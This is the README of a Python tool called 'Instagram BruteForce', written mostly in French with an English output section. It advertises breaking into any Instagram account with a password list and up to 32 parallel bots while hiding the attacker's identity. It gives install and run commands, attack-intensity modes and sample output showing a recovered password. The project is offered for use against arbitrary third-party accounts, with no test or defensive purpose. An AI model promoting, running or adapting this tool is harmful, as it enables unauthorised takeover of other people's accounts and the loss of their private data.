# Instagram BruteForce

[![Donate](https://img.shields.io/badge/PayPal-donate-orange)](https://www.paypal.me/AlexxModder)

Ce programme va forcer brutalement n’importe quel compte Instagram que vous l’envoyez à sa façon.
Il suffit de lui donner une cible, une liste de mots de passe et un mode, puis appuyez sur entrez et oubliez-le.
Pas besoin de s’inquiéter de l’anonymat lors de l’utilisation de ce programme, sa plus haute priorité est votre anonymat, 
il n’attaque que lorsque votre identité est cachée.


### Avis
Je ne maintiendrais plus ce projet.

### Soutenez-moi
> Portefeuille Bitcoin: 3JdbcHdKEV2xTmxoiwTd9xYxfQ7jBnGuB3 >> PayPal: https://www.paypal.me/AlexxModder

### Exigences
- Python v3.x.x
- ~~Kali Linux 2.0~~
- ~~Tor~~
### Installer des dépendances

```
pip3 install -r requirements.txt
```

### Aide
```
usage: instagram.py [-h] [-m MODE] username wordlist

optional arguments:
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```
### Utilisation

```
python3 instagram.py <nom> <wordlist> -m <mode>
```
### Bots (Threads)
- 4 bots: 64 mots de passe à la fois
- 8 bots: 128 mots de passe à la fois
- 16 bots: 256 mots de passe à la fois
- 32 bots: 512 mots de passe à la fois

### Modes
- 0: 32 bots
- 1: 16 bots
- 2: 8 bots
- 3: 4 bots
Mode chill
Ce mode n’utilise que 4 bots, soit 64 mots de passe à la fois.

```
C:\Users\kali\Desktop\Instagram>python3 instagram.py AlexxLy password.lst -m 3
```
### Mode modéré 1

Ce mode utilise 8 bots, soit 128 mots de passe à la fois.

```
C:\Users\kali\Desktop\Instagram>python3 instagram.py AlexxLy password.lst -m 2
```

### Mode modéré 2

Ce mode utilise 16 bots, soit 256 mots de passe à la fois.

```
C:\Users\kali\Desktop\Instagram>python3 instagram.py AlexxLy password.lst -m 1
```

### Mode sauvage

Ce mode utilise 32 bots, soit 512 mots de passe à la fois.

```
C:\Users\kali\Desktop\Instagram>python3 instagram.py AlexxLy password.lst -m 0
```

### Si vous ne spécifiez pas un mode, alors le mode est défini à 2

### ENGLISH                     

### Run                          
                                 
```                                                            
[-] Wordlist: password.lst       
[-] Username: AlexxLy            
[-] Password: 272                
[-] Complete: 34.80%             
[-] Attempts: 212                
[-] Browsers: 240                
[-] Exists: True                 
```                              
                                 
### Stop                         
                                 
```                                                            
[-] Wordlist: password.lst       
[-] Username: AlexxLy            
[-] Password: Alexx1212          
[-] Complete: 86.69%             
[-] Attempts: 345                
[-] Browsers: 192                
[-] Exists: True                 
                                 
[!] Password Found               
[+] Username: AlexxLy            
[+] Password: Alexx1212          
```
### FRANCAIS

### Courrir

```                              
[-] Liste de Mots de passe: password.lst
[-] Nom d'utilisateur: AlexxLy
[-] Mots de passe: 272
[-] Completer: 34.80%
[-] Essayer: 212
[-] Browsers: 240
[-] Existe: OUI
```                              
                              
### Arrete
```                              
[-] Liste de Mots de passe: password.lst
[-] Nom d'utilisateur: AlexxLy
[-] Mots de passe: Alexx1212
[-] Completer: 86.69%
[-] Essayer: 345
[-] Browsers: 192
[-] Existe: OUI

[!] Mots de passe Trouver
[+] Nom d'utilisateur: AlexxLy
[+] Mots de passe: Alexx1212
